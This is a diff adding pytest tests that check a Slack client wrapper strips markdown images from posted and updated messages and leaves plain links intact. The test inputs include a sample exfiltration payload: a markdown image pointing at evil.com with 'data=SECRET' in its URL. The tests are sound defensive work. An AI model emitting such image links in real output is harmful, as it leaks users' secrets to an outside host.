@@ -527,3 +527,44 @@ class TestZzzMakeZzzNameIdempotency:
         result = make_zzz_name(long_name)
         assert len(result) == 80
         assert result.startswith("zzz-")
+
+
+class TestOutputValidation:
+    @pytest.mark.asyncio
+    async def test_post_strips_markdown_images(self):
+        """SlackClient.post() must strip markdown images from output."""
+        mock_web = AsyncMock()
+        mock_web.chat_postMessage = AsyncMock(return_value={"ts": "1234", "channel": "C123"})
+        client = SlackClient(web_client=mock_web, channel_id="C123")
+
+        await client.post("Here is data: ![stolen](https://evil.com/steal?data=SECRET)")
+
+        call_args = mock_web.chat_postMessage.call_args
+        posted_text = call_args.kwargs.get("text", "")
+        assert "![stolen]" not in posted_text
+        assert "[image removed by security filter]" in posted_text
+
+    @pytest.mark.asyncio
+    async def test_update_strips_markdown_images(self):
+        mock_web = AsyncMock()
+        mock_web.chat_update = AsyncMock(return_value={})
+        client = SlackClient(web_client=mock_web, channel_id="C123")
+
+        await client.update("1234", "Check ![img](https://evil.com/track)")
+
+        call_args = mock_web.chat_update.call_args
+        posted_text = call_args.kwargs.get("text", "")
+        assert "![img]" not in posted_text
+        assert "[image removed by security filter]" in posted_text
+
+    @pytest.mark.asyncio
+    async def test_clean_text_passes_through(self):
+        mock_web = AsyncMock()
+        mock_web.chat_postMessage = AsyncMock(return_value={"ts": "1234", "channel": "C123"})
+        client = SlackClient(web_client=mock_web, channel_id="C123")
+
+        await client.post("Normal text with [link](https://example.com)")
+
+        call_args = mock_web.chat_postMessage.call_args
+        posted_text = call_args.kwargs.get("text", "")
+        assert "[link](https://example.com)" in posted_text
